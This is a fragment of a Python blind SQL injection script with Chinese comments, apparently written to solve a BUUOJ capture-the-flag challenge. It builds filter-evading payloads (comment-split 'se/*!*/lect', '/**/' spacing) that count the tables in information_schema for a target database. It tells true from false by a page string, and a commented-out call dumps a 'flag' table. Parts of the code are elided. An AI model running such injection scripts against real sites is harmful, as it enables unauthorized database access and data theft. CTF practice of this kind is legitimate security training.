...
def tb_piece(db_name):
    ...
    for i in range(100):  # 猜解库中有多少张表，合理范围即可
        tb_payload = url + "/**/and/**/%d=(se/*!*/lect/**/count(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='%s')--+" % (
        i, db_name)
        try:
...
if __name__ == '__main__':
    url = "http://7152edd8-cc82-4cbf-bd88-d463b37254ba.node4.buuoj.cn:81/search.php?id=1"  # 目标url
    str = "NO! Not this! Click others~~~"  # 布尔型盲注的true&false的判断因素
    db_length(url, str)  # 程序入口
    #dump_data(['flag'],['flag'],'security')